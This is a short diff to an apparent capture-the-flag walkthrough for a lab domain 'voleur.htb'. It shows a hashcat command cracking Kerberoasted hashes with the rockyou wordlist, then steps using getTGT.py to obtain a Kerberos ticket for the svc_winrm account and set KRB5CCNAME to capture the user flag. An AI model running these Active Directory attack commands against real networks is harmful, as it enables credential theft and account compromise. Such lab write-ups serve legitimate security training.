@@ -72,4 +72,12 @@
 
 `hashcat -m 13100 targetedKerberoast.txt /usr/share/wordlists/rockyou.txt`
 
-10. 
+10. Now get svc_winrm's TGT using the same process as before
+
+`getTGT.py -k -dc-ip dc.voleur.htb voleur.htb/svc_winrm:'[PASSWORD]'`
+
+11. Set the KRB5CCNAME env variable to the svc_winrm ccache file and now successfully compromised user flag!
+
+![image](https://github.com/user-attachments/assets/f0804929-bd52-43f2-b9b3-a7128bff4132)
+
+12. 
